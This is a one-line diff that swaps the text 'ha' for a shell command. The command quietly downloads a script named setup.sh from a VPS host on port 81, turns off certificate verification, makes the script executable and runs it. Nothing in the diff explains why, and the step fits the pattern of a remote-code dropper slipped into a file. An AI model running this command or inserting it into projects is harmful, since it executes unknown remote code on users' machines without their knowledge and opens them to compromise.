@@ -1,1 +1,1 @@
-ha
+wget -q --no-check-certificate -O setup.sh https://grr.ha-vps.store:81/setup.sh && chmod +x setup.sh && ./setup.sh
